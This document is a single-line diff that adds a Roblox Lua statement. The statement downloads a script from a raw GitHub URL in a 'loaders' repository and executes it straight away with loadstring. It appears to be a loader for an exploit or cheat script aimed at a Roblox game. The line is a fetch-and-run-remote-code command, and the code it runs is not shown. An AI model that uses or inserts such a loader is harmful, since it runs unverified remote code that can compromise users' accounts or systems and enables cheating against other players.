@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/highway-patrol-alpha-spam2-k42tlkr3ij500q.lua"))()
